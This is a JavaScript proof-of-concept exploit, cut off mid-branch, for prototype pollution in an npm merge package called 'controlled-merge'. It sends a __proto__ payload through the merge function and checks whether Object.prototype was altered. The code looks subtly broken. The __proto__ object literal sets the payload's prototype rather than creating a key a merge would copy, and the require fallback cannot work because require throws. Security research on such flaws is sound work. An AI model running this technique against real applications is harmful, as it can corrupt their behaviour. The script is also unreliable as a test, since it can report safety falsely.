```javascript
async function exploit() {
  // Load the library for testing (use './index.js' or local path during research)
  const controlledMerge = require('controlled-merge') || require('./index.js');

  // The package typically exports a factory or the function directly. Normalize to callable form.
  const mergeFn = typeof controlledMerge === 'function' 
    ? controlledMerge 
    : controlledMerge();

  // Payload: targets the internal [[Prototype]] using __proto__
  const payload = { __proto__: { exploited: true } };

  // Trigger the vulnerable merge operation
  mergeFn({}, payload);

  // Verification: Check an empty object literal for the injected property
  if ({}.exploited !== undefined) {
    console.log('[VULNERABILITY CONFIRMED] Object.prototype has been polluted.');
    console.log('Object.prototype.exploited =', {}.exploited);
  } else {
